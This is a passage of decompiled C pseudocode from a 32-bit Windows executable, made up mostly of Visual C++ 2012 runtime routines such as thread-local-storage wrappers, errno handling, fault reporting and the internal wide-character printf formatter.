{
  _DAT_0041e014 = 0;
  return;
}



void __cdecl FUN_0040783b(undefined4 param_1)

{
  if ((code *)(DAT_0041dfa0 ^ DAT_0041a038) != (code *)0x0) {
    (*(code *)(DAT_0041dfa0 ^ DAT_0041a038))(param_1);
    return;
  }
                    // WARNING: Could not recover jumptable at 0x00407853. Too many branches
                    // WARNING: Treating indirect jump as call
  TlsAlloc();
  return;
}



void __cdecl FUN_00407859(DWORD param_1)

{
  if ((code *)(DAT_0041dfa4 ^ DAT_0041a038) != (code *)0x0) {
    (*(code *)(DAT_0041dfa4 ^ DAT_0041a038))();
    return;
  }
  TlsFree(param_1);
  return;
}



void __cdecl FUN_00407878(DWORD param_1)

{
  if ((code *)(DAT_0041dfa8 ^ DAT_0041a038) != (code *)0x0) {
    (*(code *)(DAT_0041dfa8 ^ DAT_0041a038))();
    return;
  }
  TlsGetValue(param_1);
  return;
}



void __cdecl FUN_00407897(DWORD param_1,LPVOID param_2)

{
  if ((code *)(DAT_0041dfac ^ DAT_0041a038) != (code *)0x0) {
    (*(code *)(DAT_0041dfac ^ DAT_0041a038))();
    return;
  }
  TlsSetValue(param_1,param_2);
  return;
}



// Library Function - Single Match
//  ___crtGetShowWindowMode
// 
// Library: Visual Studio 2012 Release

WORD __cdecl ___crtGetShowWindowMode(void)

{
  undefined local_48 [48];
  WORD local_18;
  
  GetStartupInfoW((LPSTARTUPINFOW)local_48);
  if ((local_48[44] & 1) != 0) {
    return local_18;
  }
  return 10;
}



bool FUN_004078da(void)

{
  int iVar1;
  int iVar2;
  undefined4 local_8;
  
  iVar1 = DAT_0041a040;
  if (DAT_0041a040 < 0) {
    local_8 = 0;
    iVar1 = 0;
    if (((code *)(DAT_0041e010 ^ DAT_0041a038) != (code *)0x0) &&
       (iVar2 = (*(code *)(DAT_0041e010 ^ DAT_0041a038))(&local_8,0), iVar2 == 0x7a)) {
      iVar1 = 1;
    }
  }
  DAT_0041a040 = iVar1;
  return 0 < DAT_0041a040;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00407918(void)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(u_kernel32_dll_0041427c);
  pFVar1 = GetProcAddress(hModule,s_FlsAlloc_00414298);
  DAT_0041dfa0 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_FlsFree_004142a4);
  DAT_0041dfa4 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_FlsGetValue_004142ac);
  DAT_0041dfa8 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_FlsSetValue_004142b8);
  DAT_0041dfac = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_InitializeCriticalSectionEx_004142c4);
  _DAT_0041dfb0 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_CreateSemaphoreExW_004142e0);
  _DAT_0041dfb4 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_SetThreadStackGuarantee_004142f4);
  _DAT_0041dfb8 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_CreateThreadpoolTimer_0041430c);
  _DAT_0041dfbc = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_SetThreadpoolTimer_00414324);
  _DAT_0041dfc0 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_WaitForThreadpoolTimerCallbacks_00414338);
  _DAT_0041dfc4 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_CloseThreadpoolTimer_00414358);
  _DAT_0041dfc8 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_CreateThreadpoolWait_00414370);
  _DAT_0041dfcc = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_SetThreadpoolWait_00414388);
  _DAT_0041dfd0 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_CloseThreadpoolWait_0041439c);
  _DAT_0041dfd4 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_FlushProcessWriteBuffers_004143b0);
  _DAT_0041dfd8 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_FreeLibraryWhenCallbackReturns_004143cc);
  _DAT_0041dfdc = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_GetCurrentProcessorNumber_004143ec);
  _DAT_0041dfe0 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_GetLogicalProcessorInformation_00414408);
  _DAT_0041dfe4 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_CreateSymbolicLinkW_00414428);
  _DAT_0041dfe8 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_SetDefaultDllDirectories_0041443c);
  _DAT_0041dfec = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_EnumSystemLocalesEx_00414458);
  _DAT_0041dff4 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_CompareStringEx_0041446c);
  _DAT_0041dff0 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_GetDateFormatEx_0041447c);
  _DAT_0041dff8 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_GetLocaleInfoEx_0041448c);
  _DAT_0041dffc = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_GetTimeFormatEx_0041449c);
  _DAT_0041e000 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_GetUserDefaultLocaleName_004144ac);
  _DAT_0041e004 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_IsValidLocaleName_004144c8);
  _DAT_0041e008 = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_LCMapStringEx_004144dc);
  DAT_0041e00c = (uint)pFVar1 ^ DAT_0041a038;
  pFVar1 = GetProcAddress(hModule,s_GetCurrentPackageId_004144ec);
  DAT_0041e010 = (uint)pFVar1 ^ DAT_0041a038;
  return;
}



void __cdecl FUN_00407b57(LPTOP_LEVEL_EXCEPTION_FILTER param_1)

{
  SetUnhandledExceptionFilter(param_1);
  return;
}



// Library Function - Single Match
//  ___crtTerminateProcess
// 
// Library: Visual Studio 2012 Release

void __cdecl ___crtTerminateProcess(UINT uExitCode)

{
  HANDLE hProcess;
  
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



// Library Function - Single Match
//  ___crtUnhandledException
// 
// Library: Visual Studio 2012 Release

LONG __cdecl ___crtUnhandledException(EXCEPTION_POINTERS *exceptionInfo)

{
  LONG LVar1;
  
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar1 = UnhandledExceptionFilter(exceptionInfo);
  return LVar1;
}



// Library Function - Single Match
//  __call_reportfault
// 
// Library: Visual Studio 2012 Release

void __cdecl __call_reportfault(int nDbgHookCode,DWORD dwExceptionCode,DWORD dwExceptionFlags)

{
  uint uVar1;
  BOOL BVar2;
  LONG LVar3;
  EXCEPTION_POINTERS local_32c;
  EXCEPTION_RECORD local_324;
  undefined4 local_2d4;
  
  uVar1 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  if (nDbgHookCode != -1) {
    FUN_00407833();
  }
  local_324.ExceptionCode = 0;
  FUN_00409600(&local_324.ExceptionFlags,0,0x4c);
  local_32c.ExceptionRecord = &local_324;
  local_32c.ContextRecord = (PCONTEXT)&local_2d4;
  local_2d4 = 0x10001;
  local_324.ExceptionCode = dwExceptionCode;
  local_324.ExceptionFlags = dwExceptionFlags;
  BVar2 = IsDebuggerPresent();
  LVar3 = ___crtUnhandledException(&local_32c);
  if (((LVar3 == 0) && (BVar2 == 0)) && (nDbgHookCode != -1)) {
    FUN_00407833();
  }
  ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00407cb3(undefined4 param_1)

{
  DAT_0041b248 = param_1;
  return;
}



// Library Function - Single Match
//  __invalid_parameter
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release

void __invalid_parameter(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,
                        uintptr_t param_5)

{
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)DecodePointer(DAT_0041b248);
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x00407cd4. Too many branches
                    // WARNING: Treating indirect jump as call
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
                    // WARNING: Subroutine does not return
  __invoke_watson(param_1,param_2,param_3,param_4,param_5);
}



void FUN_00407ceb(void)

{
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return;
}



// Library Function - Single Match
//  __invoke_watson
// 
// Library: Visual Studio 2012 Release

void __cdecl
__invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)

{
  code *pcVar1;
  BOOL BVar2;
  
  BVar2 = IsProcessorFeaturePresent(0x17);
  if (BVar2 != 0) {
    pcVar1 = (code *)swi(0x29);
    (*pcVar1)();
  }
  __call_reportfault(2,0xc0000417,1);
  ___crtTerminateProcess(0xc0000417);
  return;
}



// Library Function - Single Match
//  ___doserrno
// 
// Library: Visual Studio 2012 Release

ulong * __cdecl ___doserrno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (ulong *)&DAT_0041a1b4;
  }
  return &p_Var1->_tdoserrno;
}



// Library Function - Multiple Matches With Different Base Names
//  ___acrt_errno_map_os_error
//  __dosmaperr
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release, Visual Studio 2017 Release,
// Visual Studio 2019 Release

void __cdecl FID_conflict___dosmaperr(ulong param_1)

{
  ulong *puVar1;
  int iVar2;
  int *piVar3;
  
  puVar1 = ___doserrno();
  *puVar1 = param_1;
  iVar2 = __get_errno_from_oserr(param_1);
  piVar3 = __errno();
  *piVar3 = iVar2;
  return;
}



// Library Function - Single Match
//  __errno
// 
// Library: Visual Studio 2012 Release

int * __cdecl __errno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (int *)&DAT_0041a1b0;
  }
  return &p_Var1->_terrno;
}



// Library Function - Single Match
//  __get_errno_from_oserr
// 
// Library: Visual Studio 2012 Release

int __cdecl __get_errno_from_oserr(ulong param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_0041a048)[uVar1 * 2]) {
      return (&DAT_0041a04c)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x2d);
  if (param_1 - 0x13 < 0x12) {
    return 0xd;
  }
  return (-(uint)(0xe < param_1 - 0xbc) & 0xe) + 8;
}



uint __cdecl FUN_00407dae(byte param_1,FILE *param_2)

{
  uint uVar1;
  WCHAR *pWVar2;
  char *pcVar3;
  FILE *_File;
  byte bVar4;
  WCHAR *pWVar5;
  int *piVar6;
  undefined **ppuVar7;
  undefined3 extraout_var;
  undefined *puVar8;
  FILE *pFVar9;
  longlong lVar10;
  
  _File = param_2;
  pWVar5 = (WCHAR *)__fileno(param_2);
  uVar1 = _File->_flag;
  if ((uVar1 & 0x82) == 0) {
    piVar6 = __errno();
    *piVar6 = 9;
LAB_00407dd2:
    _File->_flag = _File->_flag | 0x20;
    return 0xffffffff;
  }
  if ((uVar1 & 0x40) != 0) {
    piVar6 = __errno();
    *piVar6 = 0x22;
    goto LAB_00407dd2;
  }
  pFVar9 = (FILE *)0x0;
  if ((uVar1 & 1) != 0) {
    _File->_cnt = 0;
    if ((uVar1 & 0x10) == 0) {
      _File->_flag = uVar1 | 0x20;
      return 0xffffffff;
    }
    _File->_ptr = _File->_base;
    _File->_flag = uVar1 & 0xfffffffe;
  }
  uVar1 = _File->_flag;
  _File->_flag = uVar1 & 0xffffffef | 2;
  _File->_cnt = 0;
  if (((uVar1 & 0x10c) == 0) &&
     (((ppuVar7 = FUN_00408cc4(), _File != (FILE *)(ppuVar7 + 8) &&
       (ppuVar7 = FUN_00408cc4(), _File != (FILE *)(ppuVar7 + 0x10))) ||
      (bVar4 = FUN_0040e5f9((uint)pWVar5), CONCAT31(extraout_var,bVar4) == 0)))) {
    __getbuf(_File);
  }
  if ((_File->_flag & 0x108U) == 0) {
    param_2 = (FILE *)0x1;
    pFVar9 = (FILE *)FUN_0040a8a4(pWVar5,(WCHAR *)&param_1,(WCHAR *)0x1);
  }
  else {
    pWVar2 = (WCHAR *)_File->_base;
    pcVar3 = _File->_ptr;
    _File->_ptr = (char *)((int)pWVar2 + 1);
    param_2 = (FILE *)(pcVar3 + -(int)pWVar2);
    _File->_cnt = _File->_bufsiz + -1;
    if ((int)param_2 < 1) {
      if ((pWVar5 == (WCHAR *)0xffffffff) || (pWVar5 == (WCHAR *)0xfffffffe)) {
        puVar8 = &DAT_0041a548;
      }
      else {
        puVar8 = (undefined *)(((uint)pWVar5 & 0x1f) * 0x40 + (&DAT_0041b8c0)[(int)pWVar5 >> 5]);
      }
      if (((puVar8[4] & 0x20) != 0) && (lVar10 = FUN_0040c685((uint)pWVar5,0,0,2), lVar10 == -1))
      goto LAB_00407ee9;
    }
    else {
      pFVar9 = (FILE *)FUN_0040a8a4(pWVar5,pWVar2,(WCHAR *)param_2);
    }
    *_File->_base = param_1;
  }
  if (pFVar9 == param_2) {
    return (uint)param_1;
  }
LAB_00407ee9:
  _File->_flag = _File->_flag | 0x20;
  return 0xffffffff;
}



// WARNING: Type propagation algorithm not settling

void __cdecl FUN_00407efb(FILE *param_1,ushort *param_2,localeinfo_struct *param_3,int **param_4)

{
  ushort uVar1;
  wchar_t wVar2;
  ushort *puVar3;
  uint uVar4;
  undefined3 extraout_var;
  int iVar5;
  code *pcVar6;
  int *piVar7;
  int extraout_ECX;
  int *piVar8;
  int *piVar9;
  int *piVar10;
  int *piVar11;
  byte *pbVar12;
  bool bVar13;
  longlong lVar14;
  int **ppiVar15;
  int *piVar16;
  undefined4 uVar17;
  localeinfo_struct *plVar18;
  int *local_48c;
  int *local_488;
  undefined4 local_484;
  undefined4 local_480;
  int local_47c;
  undefined4 local_478;
  int *local_470;
  undefined4 local_46c;
  uint local_468;
  undefined4 local_464;
  int *local_460;
  int *local_45c;
  int local_458;
  int local_454;
  localeinfo_struct local_450;
  int local_448;
  char local_444;
  char local_440;
  undefined local_43f;
  wchar_t local_43c;
  short local_43a;
  uint local_438;
  int local_434;
  int local_430;
  FILE *local_42c;
  int *local_428;
  int local_424;
  int *local_420;
  int *local_41c;
  int *local_418;
  int *local_414;
  int **local_410;
  ushort *local_40c;
  int local_408 [127];
  undefined local_209 [513];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_42c = param_1;
  piVar10 = (int *)0x0;
  local_40c = param_2;
  local_410 = param_4;
  local_458 = 0;
  local_414 = (int *)0x0;
  local_428 = (int *)0x0;
  local_41c = (int *)0x0;
  local_430 = 0;
  local_454 = 0;
  local_434 = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_450,param_3);
  local_460 = __errno();
  if ((local_42c == (FILE *)0x0) || (param_2 == (ushort *)0x0)) {
    piVar10 = __errno();
    *piVar10 = 0x16;
    FUN_00407ceb();
LAB_00407f91:
    if (local_444 != '\0') {
      *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
    }
  }
  else {
    piVar8 = (int *)0x0;
    local_438 = 0;
    local_45c = (int *)0x0;
    local_420 = (int *)(uint)*param_2;
    local_424 = 0;
    local_418 = (int *)0x0;
    if (*param_2 != 0) {
      local_478 = 0x58;
      local_480 = 100;
      local_484 = 0x69;
      local_46c = 0x6f;
      piVar7 = local_470;
      do {
        puVar3 = local_40c + 1;
        if (local_424 < 0) break;
        wVar2 = (wchar_t)local_420;
        if ((ushort)(wVar2 + L'￠') < 0x59) {
          uVar4 = *(byte *)(local_420 + 0x10554e) & 0xf;
        }
        else {
          uVar4 = 0;
        }
        local_438 = (uint)((byte)(&DAT_00415558)[local_438 + uVar4 * 9] >> 4);
        switch(local_438) {
        case 0:
switchD_0040806c_caseD_0:
          local_434 = 1;
          local_40c = puVar3;
          _write_char(wVar2,local_42c,&local_424);
          piVar8 = local_418;
          puVar3 = local_40c;
          break;
        case 1:
          local_41c = (int *)0xffffffff;
          piVar10 = (int *)0x0;
          local_464 = 0;
          local_454 = 0;
          local_428 = (int *)0x0;
          local_430 = 0;
          local_414 = (int *)0x0;
          local_434 = 0;
          break;
        case 2:
          if (local_420 == (int *)0x20) {
            piVar10 = (int *)((uint)piVar10 | 2);
            local_414 = piVar10;
          }
          else if (local_420 == (int *)0x23) {
            piVar10 = (int *)((uint)piVar10 | 0x80);
            local_414 = piVar10;
          }
          else if (local_420 == (int *)0x2b) {
            piVar10 = (int *)((uint)piVar10 | 1);
            local_414 = piVar10;
          }
          else if (local_420 == (int *)0x2d) {
            piVar10 = (int *)((uint)piVar10 | 4);
            local_414 = piVar10;
          }
          else if (local_420 == (int *)0x30) {
            piVar10 = (int *)((uint)piVar10 | 8);
            local_414 = piVar10;
          }
          break;
        case 3:
          if (wVar2 == L'*') {
            local_428 = *local_410;
            local_410 = local_410 + 1;
            if ((int)local_428 < 0) {
              piVar10 = (int *)((uint)piVar10 | 4);
              local_428 = (int *)-(int)local_428;
              local_414 = piVar10;
            }
          }
          else {
            local_428 = (int *)((int)local_428 * 10 + -0x30 + (int)local_420);
          }
          break;
        case 4:
          local_41c = (int *)0x0;
          break;
        case 5:
          if (wVar2 == L'*') {
            local_41c = *local_410;
            local_410 = local_410 + 1;
            if ((int)local_41c < 0) {
              local_41c = (int *)0xffffffff;
            }
          }
          else {
            local_41c = (int *)((int)local_41c * 10 + -0x30 + (int)local_420);
          }
          break;
        case 6:
          if (local_420 == (int *)0x49) {
            uVar1 = *puVar3;
            if ((uVar1 == 0x36) && (local_40c[2] == 0x34)) {
              piVar10 = (int *)((uint)piVar10 | 0x8000);
              local_414 = piVar10;
              puVar3 = local_40c + 3;
            }
            else if ((uVar1 == 0x33) && (local_40c[2] == 0x32)) {
              piVar10 = (int *)((uint)piVar10 & 0xffff7fff);
              local_414 = piVar10;
              puVar3 = local_40c + 3;
            }
            else if (((((uVar1 != (ushort)local_480) && (uVar1 != (ushort)local_484)) &&
                      (uVar1 != (ushort)local_46c)) && ((uVar1 != 0x75 && (uVar1 != 0x78)))) &&
                    (uVar1 != (ushort)local_478)) {
              local_438 = 0;
              goto switchD_0040806c_caseD_0;
            }
          }
          else if (local_420 == (int *)0x68) {
            piVar10 = (int *)((uint)piVar10 | 0x20);
            local_414 = piVar10;
          }
          else if (local_420 == (int *)0x6c) {
            if (*puVar3 == 0x6c) {
              piVar10 = (int *)((uint)piVar10 | 0x1000);
              local_414 = piVar10;
              puVar3 = local_40c + 2;
            }
            else {
              piVar10 = (int *)((uint)piVar10 | 0x10);
              local_414 = piVar10;
            }
          }
          else if (local_420 == (int *)0x77) {
            piVar10 = (int *)((uint)piVar10 | 0x800);
            local_414 = piVar10;
          }
          break;
        case 7:
          if (local_420 < (int *)0x65) {
            if (local_420 == (int *)0x64) {
LAB_004085b3:
              piVar10 = (int *)((uint)piVar10 | 0x40);
              local_414 = piVar10;
LAB_004085bc:
              local_420 = (int *)0xa;
LAB_004085c6:
              if ((((uint)piVar10 & 0x8000) == 0) && (((uint)piVar10 & 0x1000) == 0)) {
                if (((uint)piVar10 & 0x20) == 0) {
                  if (((uint)piVar10 & 0x40) == 0) {
                    piVar7 = *local_410;
                    piVar8 = (int *)0x0;
                    local_410 = local_410 + 1;
                    goto LAB_004087a8;
                  }
                  piVar7 = *local_410;
                }
                else if (((uint)piVar10 & 0x40) == 0) {
                  piVar7 = (int *)(uint)*(ushort *)local_410;
                }
                else {
                  piVar7 = (int *)(int)*(short *)local_410;
                }
                piVar8 = (int *)((int)piVar7 >> 0x1f);
                local_410 = local_410 + 1;
              }
              else {
                piVar7 = *local_410;
                piVar8 = local_410[1];
                local_410 = local_410 + 2;
              }
LAB_004087a8:
              if (((((uint)piVar10 & 0x40) != 0) && ((int)piVar8 < 1)) && ((int)piVar8 < 0)) {
                bVar13 = piVar7 != (int *)0x0;
                piVar7 = (int *)-(int)piVar7;
                piVar8 = (int *)-(int)((int)piVar8 + (uint)bVar13);
                piVar10 = (int *)((uint)piVar10 | 0x100);
                local_414 = piVar10;
              }
              if (((uint)piVar10 & 0x9000) == 0) {
                piVar8 = (int *)0x0;
              }
              lVar14 = CONCAT44(piVar8,piVar7);
              if ((int)local_41c < 0) {
                local_41c = (int *)0x1;
              }
              else {
                piVar10 = (int *)((uint)piVar10 & 0xfffffff7);
                local_414 = piVar10;
                if (0x200 < (int)local_41c) {
                  local_41c = (int *)0x200;
                }
              }
              if (((uint)piVar7 | (uint)piVar8) == 0) {
                local_430 = 0;
              }
              piVar11 = (int *)local_209;
              local_40c = puVar3;
              while( true ) {
                piVar9 = (int *)((int)local_41c + -1);
                if (((int)local_41c < 1) && (lVar14 == 0)) break;
                local_41c = piVar9;
                lVar14 = __aulldvrm((uint)lVar14,(uint)((ulonglong)lVar14 >> 0x20),(uint)local_420,
                                    (int)local_420 >> 0x1f);
                local_418 = (int *)lVar14;
                iVar5 = extraout_ECX + 0x30;
                if (0x39 < iVar5) {
                  iVar5 = iVar5 + local_458;
                }
                *(char *)piVar11 = (char)iVar5;
                piVar11 = (int *)((int)piVar11 + -1);
                local_470 = piVar10;
              }
              piVar8 = (int *)(local_209 + -(int)piVar11);
              piVar7 = (int *)((int)piVar11 + 1);
              piVar10 = local_414;
              local_41c = piVar9;
              local_418 = piVar8;
              if ((((uint)local_414 & 0x200) != 0) &&
                 ((piVar8 == (int *)0x0 || (*(char *)piVar7 != '0')))) {
                *(undefined *)piVar11 = 0x30;
                piVar8 = (int *)(local_209 + -(int)piVar11 + 1);
                piVar7 = piVar11;
                local_418 = piVar8;
              }
            }
            else if (local_420 < (int *)0x54) {
              if (local_420 == (int *)0x53) {
                if (((uint)piVar10 & 0x830) == 0) {
                  piVar10 = (int *)((uint)piVar10 | 0x20);
                  local_414 = piVar10;
                }
                goto LAB_0040839b;
              }
              if (local_420 != (int *)0x41) {
                if (local_420 == (int *)0x43) {
                  if (((uint)piVar10 & 0x830) == 0) {
                    piVar10 = (int *)((uint)piVar10 | 0x20);
                    local_414 = piVar10;
                  }
LAB_00408452:
                  wVar2 = *(wchar_t *)local_410;
                  local_468 = (uint)(ushort)wVar2;
                  local_410 = local_410 + 1;
                  local_434 = 1;
                  if (((uint)piVar10 & 0x20) == 0) {
                    local_408[0]._0_2_ = wVar2;
                    local_40c = puVar3;
                  }
                  else {
                    local_440 = (char)wVar2;
                    local_43f = 0;
                    local_40c = puVar3;
                    iVar5 = __mbtowc_l((wchar_t *)local_408,&local_440,
                                       (local_450.locinfo)->mb_cur_max,&local_450);
                    if (iVar5 < 0) {
                      local_454 = 1;
                    }
                  }
                  piVar8 = (int *)0x1;
                  piVar7 = local_408;
                  local_418 = piVar8;
                  goto LAB_004088bc;
                }
                if ((local_420 != (int *)0x45) && (local_40c = puVar3, local_420 != (int *)0x47))
                goto LAB_004088bc;
              }
              local_420 = local_420 + 8;
              local_464 = 1;
LAB_00408335:
              piVar11 = (int *)((uint)piVar10 | 0x40);
              local_418 = (int *)0x200;
              piVar9 = local_408;
              piVar8 = local_418;
              local_414 = piVar11;
              if ((int)local_41c < 0) {
                local_41c = (int *)0x6;
                local_40c = puVar3;
              }
              else if (local_41c == (int *)0x0) {
                local_40c = puVar3;
                if ((short)local_420 == 0x67) {
                  local_41c = (int *)0x1;
                }
              }
              else {
                if (0x200 < (int)local_41c) {
                  local_41c = (int *)0x200;
                }
                local_40c = puVar3;
                if (0xa3 < (int)local_41c) {
                  piVar8 = (int *)((int)local_41c + 0x15d);
                  local_45c = (int *)__malloc_crt((size_t)piVar8);
                  piVar9 = local_45c;
                  if (local_45c == (int *)0x0) {
                    local_41c = (int *)0xa3;
                    piVar9 = local_408;
                    piVar8 = local_418;
                  }
                }
              }
              local_418 = piVar8;
              local_48c = *local_410;
              local_488 = local_410[1];
              plVar18 = &local_450;
              iVar5 = (int)(char)local_420;
              ppiVar15 = &local_48c;
              piVar8 = piVar9;
              piVar7 = local_418;
              piVar16 = local_41c;
              uVar17 = local_464;
              local_410 = local_410 + 2;
              pcVar6 = (code *)DecodePointer(PTR_LAB_0041ad38);
              (*pcVar6)(ppiVar15,piVar8,piVar7,iVar5,piVar16,uVar17,plVar18);
              if ((((uint)piVar10 & 0x80) != 0) && (local_41c == (int *)0x0)) {
                plVar18 = &local_450;
                piVar8 = piVar9;
                pcVar6 = (code *)DecodePointer(PTR_LAB_0041ad44);
                (*pcVar6)(piVar8,plVar18);
              }
              if (((short)local_420 == 0x67) && (((uint)piVar10 & 0x80) == 0)) {
                plVar18 = &local_450;
                piVar8 = piVar9;
                pcVar6 = (code *)DecodePointer(PTR_LAB_0041ad40);
                (*pcVar6)(piVar8,plVar18);
              }
              ppiVar15 = local_410;
              if (*(char *)piVar9 == '-') {
                local_414 = (int *)((uint)piVar10 | 0x140);
                piVar11 = local_414;
                piVar9 = (int *)((int)piVar9 + 1);
              }
LAB_00408517:
              local_410 = ppiVar15;
              piVar8 = (int *)_strlen((char *)piVar9);
              piVar10 = piVar11;
              piVar7 = piVar9;
              local_418 = piVar8;
            }
            else {
              if (local_420 == (int *)0x58) goto LAB_00408715;
              if (local_420 == (int *)0x5a) {
                piVar8 = *local_410;
                ppiVar15 = local_410 + 1;
                piVar11 = piVar10;
                piVar9 = (int *)PTR_DAT_0041ad0c;
                local_40c = puVar3;
                if ((piVar8 == (int *)0x0) || (piVar7 = (int *)piVar8[1], piVar7 == (int *)0x0))
                goto LAB_00408517;
                if (((uint)piVar10 & 0x800) != 0) {
                  iVar5 = (int)*(wchar_t *)piVar8 - ((int)*(wchar_t *)piVar8 >> 0x1f);
                  goto LAB_004088b4;
                }
                piVar8 = (int *)(int)*(wchar_t *)piVar8;
                local_434 = 0;
                local_418 = piVar8;
                local_410 = ppiVar15;
              }
              else {
                if (local_420 == (int *)0x61) goto LAB_00408335;
                local_40c = puVar3;
                if (local_420 == (int *)0x63) goto LAB_00408452;
              }
            }
LAB_004088bc:
            if (local_454 == 0) {
              if (((uint)piVar10 & 0x40) != 0) {
                if (((uint)piVar10 & 0x100) == 0) {
                  if (((uint)piVar10 & 1) == 0) {
                    if (((uint)piVar10 & 2) != 0) {
                      local_43c = L' ';
                      local_430 = 1;
                    }
                    goto LAB_004088f1;
                  }
                  local_43c = L'+';
                }
                else {
                  local_43c = L'-';
                }
                local_430 = 1;
              }
LAB_004088f1:
              pbVar12 = (byte *)((int)local_428 + (-local_430 - (int)piVar8));
              if (((uint)piVar10 & 0xc) == 0) {
                _write_multi_char(L' ',(int)pbVar12,local_42c,&local_424);
              }
              _write_string(&local_43c,local_430,local_42c,&local_424,local_460);
              if ((((uint)piVar10 & 8) != 0) && (((uint)piVar10 & 4) == 0)) {
                _write_multi_char(L'0',(int)pbVar12,local_42c,&local_424);
              }
              if ((local_434 == 0) && (piVar8 = local_418, piVar11 = piVar7, 0 < (int)local_418)) {
                do {
                  local_470 = (int *)((int)piVar8 - 1);
                  local_420 = piVar11;
                  local_47c = __mbtowc_l((wchar_t *)&local_468,(char *)piVar11,
                                         (local_450.locinfo)->mb_cur_max,&local_450);
                  if (local_47c < 1) {
                    local_424 = -1;
                    break;
                  }
                  _write_char((wchar_t)local_468,local_42c,&local_424);
                  local_420 = (int *)((int)local_420 + local_47c);
                  piVar8 = local_470;
                  piVar11 = local_420;
                } while (0 < (int)local_470);
              }
              else {
                _write_string((wchar_t *)piVar7,(int)local_418,local_42c,&local_424,local_460);
              }
              if ((-1 < local_424) && (((uint)piVar10 & 4) != 0)) {
                _write_multi_char(L' ',(int)pbVar12,local_42c,&local_424);
              }
            }
          }
          else {
            if ((int *)0x70 < local_420) {
              if (local_420 == (int *)0x73) {
LAB_0040839b:
                piVar11 = (int *)0x7fffffff;
                if (local_41c != (int *)0xffffffff) {
                  piVar11 = local_41c;
                }
                ppiVar15 = local_410 + 1;
                piVar9 = *local_410;
                if (((uint)piVar10 & 0x20) == 0) {
                  piVar7 = piVar9;
                  if (piVar9 == (int *)0x0) {
                    piVar9 = (int *)PTR_DAT_0041ad10;
                    piVar7 = (int *)PTR_DAT_0041ad10;
                  }
                  for (; (piVar11 != (int *)0x0 &&
                         (piVar11 = (int *)((int)piVar11 + -1), *(wchar_t *)piVar9 != L'\0'));
                      piVar9 = (int *)((int)piVar9 + 2)) {
                  }
                  iVar5 = (int)piVar9 - (int)piVar7;
LAB_004088b4:
                  local_410 = local_410 + 1;
                  local_434 = 1;
                  piVar8 = (int *)(iVar5 >> 1);
                  local_418 = piVar8;
                  local_40c = puVar3;
                }
                else {
                  if (piVar9 == (int *)0x0) {
                    piVar9 = (int *)PTR_DAT_0041ad0c;
                  }
                  local_418 = (int *)0x0;
